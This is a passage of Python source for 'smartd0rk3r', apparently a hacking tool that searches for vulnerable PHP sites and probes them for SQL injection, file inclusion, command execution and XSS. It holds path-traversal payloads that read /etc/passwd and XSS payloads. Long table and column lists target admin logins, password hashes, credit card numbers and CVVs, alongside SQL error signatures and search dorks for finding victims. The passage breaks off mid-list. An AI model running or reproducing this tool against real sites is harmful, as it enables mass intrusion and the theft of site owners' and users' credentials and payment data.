#!/usr/bin/python
#
# smartd0rk3r.py - a modified darkd0rk3r
#   - added dork array
#   - added input for number of random dorks
#   - added bugfix for over tor (it crashed alot over tor)
#   - added optimization, 1 page with 0 results, skip to next dork
#   - added extra check for links to comply with target (makes it alot more target-specific)
#     put main instructions together, added 12 - new scan option
#   - added Column Finder
#   - added column and table fuzzer
#
# rewrite done by levi
# Column Finder added by baltazar
# Fuzzer added by baltazar
# mad propz to the original author for making a nice script that was easily modified!!!!
#
# original header:
#
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# Toolname        : darkd0rk3r.py
# Coder           : baltazar a.k.a b4ltazar < b4ltazar@gmail.com>
# Version         : 1.0
# greetz for all members of ex darkc0de.com, ljuska.org
# 

import string, sys, time, urllib2, cookielib, re, random, threading, socket, os, subprocess
from random import choice

# Colours
W  = "\033[0m";  
R  = "\033[31m"; 
G  = "\033[32m"; 
O  = "\033[33m"; 
B  = "\033[34m";


# Banner
def logo():
	print R+"\n|---------------------------------------------------------------|"
        print "| smartd0rk3r.py - a modified darkd0rk3r.py                     |"
        print "|   10/2012        - v.0.3                                      |"
        print "|     levi           - l3v1athan@tormail.org                    |"
        print "|     baltazar       - b4ltazar@gmail.com                       |"
        print "|                                                               |"
        print "|---------------------------------------------------------------|\n"
	print W

if sys.platform == 'linux' or sys.platform == 'linux2':
  subprocess.call("clear", shell=True)
  logo()
  
else:
  subprocess.call("cls", shell=True)
  logo()
  
log = "smartd0rk3r-sqli.txt"
logfile = open(log, "a")
lfi_log = "smartd0rk3r-lfi.txt"
lfi_log_file = open(lfi_log, "a")
rce_log = "smartd0rk3r-rce.txt"
rce_log_file = open(rce_log, "a")
xss_log = "smartd0rk3r-xss.txt"
xss_log_file = open(xss_log, "a")

arg_end = "--"
arg_eva = "+"
colMax = 10 # Change this at your will
gets = 0
file = "/etc/passwd"
threads = []
darkurl = []
vuln = []
col = []
timeout = 60
socket.setdefaulttimeout(timeout)



           
lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]

xsses = ["<h1>XSS by baltazar</h1>","%3Ch1%3EXSS%20by%20baltazar%3C/h1%3E"]

tables = ['user','users','tbladmins','Logins','logins','login','admins','members','member', '_wfspro_admin', '4images_users', 'a_admin', 'account', 'accounts', 'adm', 'admin', 'admin_login', 'admin_user', 'admin_userinfo', 'administer', 'administrable', 'administrate', 'administration', 'administrator', 'administrators', 'adminrights', 'admins', 'adminuser','adminusers','article_admin', 'articles', 'artikel','author', 'autore', 'backend', 'backend_users', 'backenduser', 'bbs', 'book', 'chat_config', 'chat_messages', 'chat_users', 'client', 'clients', 'clubconfig', 'company', 'config', 'contact', 'contacts', 'content', 'control', 'cpg_config', 'cpg132_users', 'customer', 'customers', 'customers_basket', 'dbadmins', 'dealer', 'dealers', 'diary', 'download', 'Dragon_users', 'e107.e107_user', 'e107_user', 'forum.ibf_members', 'fusion_user_groups', 'fusion_users', 'group', 'groups', 'ibf_admin_sessions', 'ibf_conf_settings', 'ibf_members', 'ibf_members_converge', 'ibf_sessions', 'icq', 'index', 'info', 'ipb.ibf_members', 'ipb_sessions', 'joomla_users', 'jos_blastchatc_users', 'jos_comprofiler_members', 'jos_contact_details', 'jos_joomblog_users', 'jos_messages_cfg', 'jos_moschat_users', 'jos_users', 'knews_lostpass', 'korisnici', 'kpro_adminlogs', 'kpro_user', 'links', 'login_admin', 'login_admins', 'login_user', 'login_users','logon', 'logs', 'lost_pass', 'lost_passwords', 'lostpass', 'lostpasswords', 'm_admin', 'main', 'mambo_session', 'mambo_users', 'manage', 'manager', 'mb_users','memberlist','minibbtable_users', 'mitglieder', 'mybb_users', 'mysql', 'name', 'names', 'news', 'news_lostpass', 'newsletter', 'nuke_users', 'obb_profiles', 'order', 'orders', 'parol', 'partner', 'partners', 'passes', 'password', 'passwords', 'perdorues', 'perdoruesit', 'phorum_session', 'phorum_user', 'phorum_users', 'phpads_clients', 'phpads_config', 'phpbb_users', 'phpBB2.forum_users', 'phpBB2.phpbb_users', 'phpmyadmin.pma_table_info', 'pma_table_info', 'poll_user', 'punbb_users', 'pwd', 'pwds', 'reg_user', 'reg_users', 'registered', 'reguser', 'regusers', 'session', 'sessions', 'settings', 'shop.cards', 'shop.orders', 'site_login', 'site_logins', 'sitelogin', 'sitelogins', 'sites', 'smallnuke_members', 'smf_members', 'SS_orders', 'statistics', 'superuser', 'sysadmin', 'sysadmins', 'system', 'sysuser', 'sysusers', 'table', 'tables', 'tb_admin', 'tb_administrator', 'tb_login', 'tb_member', 'tb_members', 'tb_user', 'tb_username', 'tb_usernames', 'tb_users', 'tbl', 'tbl_user', 'tbl_users', 'tbluser', 'tbl_clients', 'tbl_client', 'tblclients', 'tblclient', 'test', 'usebb_members','user_admin', 'user_info', 'user_list', 'user_login', 'user_logins', 'user_names', 'usercontrol', 'userinfo', 'userlist', 'userlogins', 'username', 'usernames', 'userrights','vb_user', 'vbulletin_session', 'vbulletin_user', 'voodoo_members', 'webadmin', 'webadmins', 'webmaster', 'webmasters', 'webuser', 'webusers','wp_users', 'x_admin', 'xar_roles', 'xoops_bannerclient', 'xoops_users', 'yabb_settings', 'yabbse_settings', 'Category', 'CategoryGroup', 'ChicksPass', 'dtproperties', 'JamPass', 'News', 'Passwords by usage count', 'PerfPassword', 'PerfPasswordAllSelected','pristup', 'SubCategory', 'tblRestrictedPasswords', 'Ticket System Acc Numbers', 'Total Members', 'UserPreferences', 'tblConfigs', 'tblLogBookAuthor', 'tblLogBookUser', 'tblMails', 'tblOrders', 'tblUser', 'cms_user', 'cms_users', 'cms_admin', 'cms_admins', 'user_name', 'jos_user', 'table_user', 'email', 'mail', 'bulletin', 'login_name', 'admuserinfo', 'userlistuser_list', 'SiteLogin', 'Site_Login', 'UserAdmin']

columns = ['user', 'username', 'password', 'passwd', 'pass', 'cc_number', 'id', 'email', 'emri', 'fjalekalimi', 'pwd', 'user_name', 'customers_email_address', 'customers_password', 'user_password', 'name', 'user_pass', 'admin_user', 'admin_password', 'admin_pass', 'usern', 'user_n', 'users', 'login', 'logins', 'login_user', 'login_admin', 'login_username', 'user_username', 'user_login', 'auid', 'apwd', 'adminid', 'admin_id', 'adminuser', 'adminuserid', 'admin_userid', 'adminusername', 'admin_username', 'adminname', 'admin_name', 'usr', 'usr_n', 'usrname', 'usr_name', 'usrpass', 'usr_pass', 'usrnam', 'nc', 'uid', 'userid', 'user_id', 'myusername', 'mail', 'emni', 'logohu', 'punonjes', 'kpro_user', 'wp_users', 'emniplote', 'perdoruesi', 'perdorimi', 'punetoret', 'logini', 'llogaria', 'fjalekalimin', 'kodi', 'emer', 'ime', 'korisnik', 'korisnici', 'user1', 'administrator', 'administrator_name', 'mem_login', 'login_password', 'login_pass', 'login_passwd', 'login_pwd', 'sifra', 'lozinka', 'psw', 'pass1word', 'pass_word', 'passw', 'pass_w', 'user_passwd', 'userpass', 'userpassword', 'userpwd', 'user_pwd', 'useradmin', 'user_admin', 'mypassword', 'passwrd', 'admin_pwd', 'admin_passwd', 'mem_password', 'memlogin', 'e_mail', 'usrn', 'u_name', 'uname', 'mempassword', 'mem_pass', 'mem_passwd', 'mem_pwd', 'p_word', 'pword', 'p_assword', 'myname', 'my_username', 'my_name', 'my_password', 'my_email', 'korisnicko', 'cvvnumber ', 'about', 'access', 'accnt', 'accnts', 'account', 'accounts', 'admin', 'adminemail', 'adminlogin', 'adminmail', 'admins', 'aid', 'aim', 'auth', 'authenticate', 'authentication', 'blog', 'cc_expires', 'cc_owner', 'cc_type', 'cfg', 'cid', 'clientname', 'clientpassword', 'clientusername', 'conf', 'config', 'contact', 'converge_pass_hash', 'converge_pass_salt', 'crack', 'customer', 'customers', 'cvvnumber', 'data', 'db_database_name', 'db_hostname', 'db_password', 'db_username', 'download', 'e-mail', 'emailaddress', 'full', 'gid', 'group', 'group_name', 'hash', 'hashsalt', 'homepage', 'icq', 'icq_number', 'id_group', 'id_member', 'images', 'index', 'ip_address', 'last_ip', 'last_login', 'lastname', 'log', 'login_name', 'login_pw', 'loginkey', 'loginout', 'logo', 'md5hash', 'member', 'member_id', 'member_login_key', 'member_name', 'memberid', 'membername', 'members', 'new', 'news', 'nick', 'number', 'nummer', 'pass_hash', 'passwordsalt', 'passwort', 'personal_key', 'phone', 'privacy', 'pw', 'pwrd', 'salt', 'search', 'secretanswer', 'secretquestion', 'serial', 'session_member_id', 'session_member_login_key', 'sesskey', 'setting', 'sid', 'spacer', 'status', 'store', 'store1', 'store2', 'store3', 'store4', 'table_prefix', 'temp_pass', 'temp_password', 'temppass', 'temppasword', 'text', 'un', 'user_email', 'user_icq', 'user_ip', 'user_level', 'user_passw', 'user_pw', 'user_pword', 'user_pwrd', 'user_un', 'user_uname', 'user_usernm', 'user_usernun', 'user_usrnm', 'userip', 'userlogin', 'usernm', 'userpw', 'usr2', 'usrnm', 'usrs', 'warez', 'xar_name', 'xar_pass']


sqlerrors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format'}
             

header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
          'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
          'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
	  'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
	  'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
	  'Microsoft Internet Explorer/4.0b1 (Windows 95)',
	  'Opera/8.00 (Windows NT 5.1; U; en)',
	  'amaya/9.51 libwww/5.4.0',
	  'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	  'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
	  'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']
	  
           

d0rk = [ 'artikelinfo.php?id=', 'index.php?=', 'profile_view.php?id=', 'category.php?id=', 'fellows.php?id=', 'downloads_info.php?id=', 'prod_info.php?id=', 'shop.php?do=part&id=', 'collectionitem.php?id=', 'band_info.php?id=', 'product.php?id=', 'viewshowdetail.php?id=', 'clubpage.php?id=', 'memberInfo.php?id=', 'tradeCategory.php?id=', 'transcript.php?id=', 'item_id=', 'news-full.php?id=', 'aboutbook.php?id=', 'preview.php?id=', 'material.php?id=', 'read.php?id=', 'viewapp.php?id=', 'story.php?id=', 'newsone.php?id=', 'rubp.php?idr=', 'art.php?idm=', 'title.php?id=', 'index1.php?modo=', 'include.php?*[*]*=', 'nota.php?pollname=', 'index3.php?p=', 'padrao.php?pre=', 'home.php?pa=', 'main.php?type=', 'sitio.php?start=', '*.php?include=', 'general.php?xlink=', 'show.php?go=', 'nota.php?ki=', 'down*.php?oldal=', 'layout.php?disp=', 'enter.php?chapter=', 'base.php?incl=', 'enter.php?mod=', 'show.php?corpo=', 'head.php?*[*]*=', 'info.php?strona=', 'template.php?str=', 'main.php?doshow=', 'view.php?*[*]*=', 'index.php?to=', 'page.php?cmd=', 'view.php?b=', 'info.php?option=', 'show.php?x=', 'template.php?texto=', 'index3.php?ir=', 'print.php?chapter=', 'file.php?inc=', 'file.php?cont=', 'view.php?cmd=', 'include.php?chapter=', 'path.php?my=', 'principal.php?param=', 'general.php?menue=', 'index1.php?b=', 'info.php?chapter=', 'nota.php?chapter=', 'readnews.php?id=', 'newsone.php?id=', 'product-item.php?id=', 'pages.php?id=', 'clanek.php4?id=', 'viewapp.php?id=', 'viewphoto.php?id=', 'galeri_info.php?l=', 'iniziativa.php?in=', 'curriculum.php?id=', 'labels.php?id=', 'story.php?id=', 'look.php?ID=', 'aboutbook.php?id=', '"id=" & intext:"Warning: mysql_fetch_assoc()', '"id=" & intext:"Warning: is_writable()', '"id=" & intext:"Warning: Unknown()', '"id=" & intext:"Warning: mysql_result()', '"id=" & intext:"Warning: pg_exec()', '"id=" & intext:"Warning: require()', 'buy.php?category=', 'pageid=', 'page.php?file=', 'show.php?id=', 'newsitem.php?num=', 'readnews.php?id=', 'top10.php?cat=', 'reagir.php?num=', 'Stray-Questions-View.php?num=', 'forum_bds.php?num=', 'game.php?id=', 'view_product.php?id=', 'sw_comment.php?id=', 'news.php?id=', 'avd_start.php?avd=', 'event.php?id=', 'sql.php?id=', 'select_biblio.php?id=', 'ogl_inet.php?ogl_id=', 'fiche_spectacle.php?id=', 'kategorie.php4?id=', 'faq2.php?id=', 'show_an.php?id=', 'loadpsb.php?id=', 'announce.php?id=', 'participant.php?id=', 'download.php?id=', 'article.php?id=', 'person.php?id=', 'productinfo.php?id=', 'showimg.php?id=', 'rub.php?idr=', 'view_faq.php?id=', 'hosting_info.php?id=', 'gery.php?id=', 'rub.php?idr=', 'view_faq.php?id=', 'artikelinfo.php?id=', 'detail.php?ID=', 'index.php?=', 'profile_view.php?id=', 'category.php?id=', 'publications.php?id=', 'fellows.php?id=', 'downloads_info.php?id=', 'prod_info.php?id=', 'shop.php?do=part&id=', 'collectionitem.php?id=', 'band_info.php?id=', 'product.php?id=', 'releases.php?id=', 'ray.php?id=', 'produit.php?id=', 'pop.php?id=', 'shopping.php?id=']
d0rk += [ 'productdetail.php?id=', 'post.php?id=', 'viewshowdetail.php?id=', 'clubpage.php?id=', 'memberInfo.php?id=', 'section.php?id=', 'theme.php?id=', 'page.php?id=', 'shredder-categories.php?id=', 'tradeCategory.php?id=', 'product_ranges_view.php?ID=', 'shop_category.php?id=', 'transcript.php?id=', 'channel_id=', 'item_id=', 'newsid=', 'trainers.php?id=', 'news-full.php?id=', 'news_display.php?getid=', 'index2.php?option=', 'article.php?ID=', 'play_old.php?id=', 'newsitem.php?num=', 'top10.php?cat=', 'historialeer.php?num=', 'reagir.php?num=', 'Stray-Questions-View.php?num=', 'forum_bds.php?num=', 'game.php?id=', 'view_product.php?id=', 'sw_comment.php?id=', 'news.php?id=', 'avd_start.php?avd=', 'event.php?id=', 'sql.php?id=', 'news_view.php?id=', 'select_biblio.php?id=', 'humor.php?id=', 'ogl_inet.php?ogl_id=', 'fiche_spectacle.php?id=', 'communique_detail.php?id=', 'sem.php3?id=', 'kategorie.php4?id=', 'faq2.php?id=', 'show_an.php?id=', 'preview.php?id=', 'loadpsb.php?id=', 'opinions.php?id=', 'spr.php?id=', 'announce.php?id=', 'participant.php?id=', 'download.php?id=', 'main.php?id=', 'review.php?id=', 'chappies.php?id=', 'read.php?id=', 'prod_detail.php?id=', 'article.php?id=', 'person.php?id=', 'productinfo.php?id=', 'showimg.php?id=', 'view.php?id=', 'website.php?id=', 'website.php?id=', 'hosting_info.php?id=', 'gery.php?id=', 'detail.php?ID=', 'publications.php?id=', 'Productinfo.php?id=', 'releases.php?id=', 'ray.php?id=', 'produit.php?id=', 'pop.php?id=', 'shopping.php?id=', 'productdetail.php?id=', 'post.php?id=', 'section.php?id=', 'theme.php?id=', 'page.php?id=', 'shredder-categories.php?id=', 'product_ranges_view.php?ID=', 'shop_category.php?id=', 'channel_id=', 'newsid=', 'news_display.php?getid=', 'ages.php?id=', 'clanek.php4?id=', 'review.php?id=', 'iniziativa.php?in=', 'curriculum.php?id=', 'labels.php?id=', 'look.php?ID=', 'galeri_info.php?l=', 'tekst.php?idt=', 'newscat.php?id=', 'newsticker_info.php?idn=', 'rubrika.php?idr=', 'offer.php?idf=', '"id=" & intext:"Warning: mysql_fetch_array()', '"id=" & intext:"Warning: getimagesize()', '"id=" & intext:"Warning: session_start()', '"id=" & intext:"Warning: mysql_num_rows()', '"id=" & intext:"Warning: mysql_query()', '"id=" & intext:"Warning: array_merge()', '"id=" & intext:"Warning: preg_match()', '"id=" & intext:"Warning: ilesize()', '"id=" & intext:"Warning: filesize()', 'index.php?id=', 'buy.php?category=', 'index.php?page=', 'trainers.php?id=', 'article.php?ID=', 'play_old.php?id=', 'declaration_more.php?decl_id=', 'Pageid=', 'games.php?id=', 'newsDetail.php?id=', 'staff_id=', 'historialeer.php?num=', 'product-item.php?id=', 'news_view.php?id=', 'humor.php?id=', 'communique_detail.php?id=', 'sem.php3?id=', 'opinions.php?id=', 'spr.php?id=', 'pages.php?id=', 'chappies.php?id=', 'prod_detail.php?id=', 'viewphoto.php?id=', 'view.php?id=' ]
d0rk += [ 'general.php?include=', 'start.php?addr=', 'index1.php?qry=', 'index1.php?loc=', 'page.php?addr=', 'index1.php?dir=', 'principal.php?pr=', 'press.php?seite=', 'head.php?cmd=', 'home.php?sec=', 'home.php?category=', 'standard.php?cmd=', 'mod*.php?thispage=', 'base.php?to=', 'view.php?choix=', 'base.php?panel=', 'template.php?mod=', 'info.php?j=', 'blank.php?pref=', 'sub*.php?channel=', 'standard.php?in=', 'general.php?cmd=', 'pagina.php?panel=', 'template.php?where=', 'path.php?channel=', 'gery.php?seccion=', 'page.php?tipo=', 'sitio.php?rub=', 'pagina.php?u=', 'file.php?ir=', '*inc*.php?sivu=', 'path.php?start=', 'page.php?chapter=', 'home.php?recipe=', 'enter.php?pname=', 'layout.php?path=', 'print.php?open=', 'mod*.php?channel=', 'down*.php?phpbb_root_path=', '*inc*.php?str=', 'gery.php?phpbb_root_path=', 'include.php?middlePart=', 'sub*.php?destino=', 'info.php?read=', 'home.php?sp=', 'main.php?strona=', 'sitio.php?get=', 'sitio.php?index=', 'index3.php?option=', 'enter.php?a=', 'main.php?second=', 'print.php?pname=', 'blank.php?itemnav=', 'blank.php?pagina=', 'index1.php?d=', 'down*.php?where=', '*inc*.php?include=', 'path.php?pre=', 'home.php?loader=', 'start.php?eval=', 'index.php?disp=', 'head.php?mod=', 'sitio.php?section=', 'nota.php?doshow=', 'home.php?seite=', 'home.php?a=', 'page.php?url=', 'pagina.php?left=', 'layout.php?c=', 'principal.php?goto=', 'standard.php?base_dir=', 'home.php?where=', 'page.php?sivu=', '*inc*.php?adresa=', 'padrao.php?str=', 'include.php?my=', 'show.php?home=', 'index.php?load=', 'index3.php?rub=', 'sub*.php?str=', 'start.php?index=', 'nota.php?mod=', 'sub*.php?mid=', 'index1.php?*[*]*=', 'pagina.php?oldal=', 'padrao.php?loc=', 'padrao.php?rub=', 'page.php?incl=', 'gery.php?disp=', 'nota.php?oldal=', 'include.php?u=', 'principal.php?pagina=', 'print.php?choix=', 'head.php?filepath=', 'include.php?corpo=', 'sub*.php?action=', 'head.php?pname=', 'press.php?dir=', 'show.php?xlink=', 'file.php?left=', 'nota.php?destino=', 'general.php?module=', 'index3.php?redirect=', 'down*.php?param=', 'default.php?ki=', 'padrao.php?h=', 'padrao.php?read=', 'mod*.php?cont=', 'index1.php?l=', 'down*.php?pr=', 'gery.php?viewpage=', 'template.php?load=', 'nota.php?pr=', 'padrao.php?destino=', 'index2.php?channel=', 'principal.php?opcion=', 'start.php?str=', 'press.php?*[*]*=', 'index.php?ev=', 'pagina.php?pre=', 'nota.php?content=', 'include.php?adresa=', 'sitio.php?t=', 'index.php?sivu=', 'principal.php?q=', 'path.php?ev=', 'print.php?module=', 'index.php?loc=', 'nota.php?basepath=', 'padrao.php?tipo=', 'index2.php?in=', 'principal.php?eval=', 'file.php?qry=', 'info.php?t=', 'enter.php?play=', 'general.php?var=', 'principal.php?s=', 'standard.php?pagina=', 'standard.php?subject=', 'base.php?second=', 'head.php?inc=', 'pagina.php?basepath=', 'main.php?pname=', '*inc*.php?modo=', 'include.php?goto=', 'file.php?pg=', 'head.php?g=', 'general.php?header=', 'start.php?*root*=', 'enter.php?pref=']
d0rk += [ 'index3.php?open=', 'start.php?module=', 'main.php?load=', 'enter.php?pg=', 'padrao.php?redirect=', 'pagina.php?my=', 'gery.php?pre=', 'enter.php?w=', 'info.php?texto=', 'enter.php?open=', 'base.php?rub=', 'gery.php?*[*]*=', 'include.php?cmd=', 'standard.php?dir=', 'layout.php?page=', 'index3.php?pageweb=', 'include.php?numero=', 'path.php?destino=', 'index3.php?home=', 'default.php?seite=', 'path.php?eval=', 'base.php?choix=', 'template.php?cont=', 'info.php?pagina=', 'default.php?x=', 'default.php?option=', 'gery.php?ki=', 'down*.php?second=', 'blank.php?path=', 'pagina.php?v=', 'file.php?pollname=', 'index3.php?var=', 'layout.php?goto=', 'pagina.php?incl=', 'home.php?action=', 'include.php?oldal=', 'print.php?left=', 'print.php?u=', 'nota.php?v=', 'home.php?str=', 'press.php?panel=', 'page.php?mod=', 'default.php?param=', 'down*.php?texto=', 'mod*.php?dir=', 'view.php?where=', 'blank.php?subject=', 'path.php?play=', 'base.php?l=', 'index2.php?rub=', 'general.php?opcion=', 'layout.php?xlink=', 'padrao.php?name=', 'pagina.php?nivel=', 'default.php?oldal=', 'template.php?k=', 'main.php?chapter=', 'layout.php?chapter=', 'layout.php?incl=', 'include.php?url=', 'base.php?sivu=', 'index.php?link=', 'sub*.php?cont=', 'info.php?oldal=', 'general.php?rub=', 'default.php?str=', 'head.php?ev=', 'sub*.php?path=', 'view.php?page=', 'main.php?j=', 'index2.php?basepath=', 'gery.php?qry=', 'main.php?url=', 'default.php?incl=', 'show.php?redirect=', 'index1.php?pre=', 'general.php?base_dir=', 'start.php?in=', 'show.php?abre=', 'index1.php?home=', 'home.php?ev=', 'index2.php?ki=', 'base.php?pag=', 'default.php?ir=', 'general.php?qry=', 'index2.php?home=', 'press.php?nivel=', 'enter.php?pr=', 'blank.php?loader=', 'start.php?cmd=', 'padrao.php?d=', 'sitio.php?recipe=', 'principal.php?read=', 'standard.php?showpage=', 'main.php?pg=', 'page.php?panel=', 'press.php?addr=', 'template.php?s=', 'main.php?tipo=', '*inc*.php?ev=', 'padrao.php?page=', 'show.php?thispage=', 'home.php?secao=', 'main.php?start=', 'enter.php?mid=', 'press.php?id=', 'main.php?inc=', 'index3.php?cmd=', 'index.php?pname=', 'press.php?subject=', 'include.php?sec=', 'index3.php?xlink=', 'general.php?texto=', 'index3.php?go=', 'index.php?cmd=', 'index3.php?disp=', 'index3.php?left=', 'sub*.php?middle=', 'show.php?modo=', 'index1.php?pagina=', 'head.php?left=', 'enter.php?phpbb_root_path=', 'show.php?z=', 'start.php?basepath=', 'blank.php?strona=', 'template.php?y=', 'page.php?where=', 'layout.php?category=', 'index1.php?my=', 'principal.php?phpbb_root_path=', 'nota.php?channel=', 'page.php?choix=', 'start.php?xlink=', 'home.php?k=', 'standard.php?phpbb_root_path=', 'principal.php?middlePart=', 'mod*.php?m=', 'index.php?recipe=', 'template.php?path=', 'pagina.php?dir=', 'sitio.php?abre=', 'index1.php?recipe=', 'blank.php?page=', 'sub*.php?category=', '*inc*.php?body=', 'enter.php?middle=', 'home.php?path=', 'down*.php?pre=', 'base.php?w=', 'main.php?path=' ]
d0rk += [ 'nota.php?ir=', 'press.php?link=', 'gery.php?pollname=', 'down*.php?open=', 'down*.php?pageweb=', 'default.php?eval=', 'view.php?showpage=', 'show.php?get=', 'sitio.php?tipo=', 'layout.php?cont=', 'default.php?destino=', 'padrao.php?seccion=', 'down*.php?r=', 'main.php?param=', 'standard.php?e=', 'down*.php?in=', 'nota.php?include=', 'sitio.php?secao=', 'print.php?my=', 'general.php?abre=', 'general.php?link=', 'default.php?id=', 'standard.php?panel=', 'show.php?channel=', 'enter.php?r=', 'index3.php?phpbb_root_path=', 'gery.php?where=', 'head.php?middle=', 'sub*.php?load=', 'gery.php?sp=', 'show.php?chapter=', 'sub*.php?b=', 'general.php?adresa=', 'print.php?goto=', 'sub*.php?sp=', 'template.php?doshow=', 'padrao.php?base_dir=', 'index2.php?my=', 'include.php?w=', 'start.php?op=', 'main.php?section=', 'view.php?header=', 'layout.php?menue=', 'head.php?y=', 'sub*.php?content=', 'show.php?type=', 'base.php?id=', 'mod*.php?qry=', 'default.php?strona=', 'sitio.php?chapter=', 'gery.php?index=', 'nota.php?h=', 'page.php?oldal=', 'enter.php?panel=', 'blank.php?t=', 'start.php?pollname=', 'sub*.php?module=', 'enter.php?thispage=', 'mod*.php?index=', 'sitio.php?r=', 'sub*.php?play=', 'index2.php?doshow=', 'index2.php?chapter=', 'show.php?path=', 'gery.php?to=', 'info.php?base_dir=', 'gery.php?abre=', 'gery.php?pag=', 'view.php?channel=', 'default.php?mod=', 'index.php?op=', 'general.php?pre=', 'padrao.php?type=', 'template.php?pag=', 'standard.php?pre=', 'blank.php?ref=', 'down*.php?z=', 'general.php?inc=', 'home.php?read=', 'pagina.php?section=', 'default.php?basepath=', 'index.php?pre=', 'sitio.php?pageweb=', 'base.php?seite=', '*inc*.php?j=', 'index2.php?filepath=', 'file.php?type=', 'index1.php?oldal=', 'index2.php?second=', 'index3.php?sekce=', 'info.php?filepath=', 'base.php?opcion=', 'path.php?category=', 'index3.php?start=', 'start.php?rub=', '*inc*.php?i=', 'blank.php?pre=', 'general.php?channel=', 'index2.php?OpenPage=', 'page.php?section=', 'mod*.php?middle=', 'index1.php?goFile=', 'blank.php?action=', 'principal.php?loader=', 'sub*.php?op=', 'main.php?addr=', 'start.php?mid=', 'gery.php?secao=', 'pagina.php?tipo=', 'index.php?w=', 'head.php?where=', 'principal.php?tipo=', 'press.php?loader=', 'gery.php?showpage=', 'gery.php?go=', 'enter.php?start=', 'press.php?lang=', 'general.php?p=', 'index.php?sekce=', 'index2.php?get=', 'sitio.php?go=', 'include.php?cont=', 'sub*.php?where=', 'index3.php?index=', 'path.php?recipe=', 'info.php?loader=', 'print.php?sp=', 'page.php?phpbb_root_path=', 'path.php?body=', 'principal.php?menue=', 'print.php?cont=', 'pagina.php?z=', 'default.php?mid=', 'blank.php?xlink=', 'sub*.php?oldal=', 'general.php?b=', 'include.php?left=', 'print.php?sivu=', 'press.php?OpenPage=', 'default.php?cont=', 'general.php?pollname=', 'template.php?nivel=', 'enter.php?page=', 'file.php?middle=', 'standard.php?str=', 'gery.php?get=', 'main.php?v=', 'down*.php?subject=', 'enter.php?sivu=' ]
d0rk += [ 'path.php?option=', 'index.php?strona=', 'index1.php?choix=', 'index2.php?f=', 'press.php?destino=', 'pagina.php?channel=', 'principal.php?b=', 'home.php?include=', 'head.php?numero=', 'general.php?ref=', 'main.php?dir=', 'gery.php?cont=', 'principal.php?type=', 'file.php?param=', 'default.php?secao=', 'path.php?pageweb=', 'info.php?r=', 'base.php?phpbb_root_path=', 'main.php?itemnav=', 'view.php?pg=', 'pagina.php?choix=', 'default.php?itemnav=', 'index2.php?cmd=', 'layout.php?url=', 'index.php?path=', 'index1.php?second=', 'start.php?modo=', 'index1.php?get=', 'index3.php?my=', 'sub*.php?left=', 'print.php?inc=', 'view.php?type=', 'path.php?*[*]*=', 'base.php?adresa=', 'index3.php?oldal=', 'standard.php?body=', 'base.php?path=', 'principal.php?strona=', 'info.php?l=', 'template.php?left=', 'head.php?loc=', 'page.php?ir=', 'print.php?path=', 'down*.php?path=', 'sitio.php?opcion=', 'pagina.php?category=', 'press.php?menu=', 'index2.php?pref=', 'sitio.php?incl=', 'show.php?ki=', 'index3.php?x=', 'page.php?strona=', '*inc*.php?open=', 'index3.php?secao=', 'standard.php?*[*]*=', 'template.php?basepath=', 'standard.php?goFile=', 'index2.php?ir=', 'file.php?modo=', 'gery.php?itemnav=', 'main.php?oldal=', 'down*.php?showpage=', 'start.php?destino=', 'blank.php?rub=', 'path.php?ir=', 'layout.php?var=', 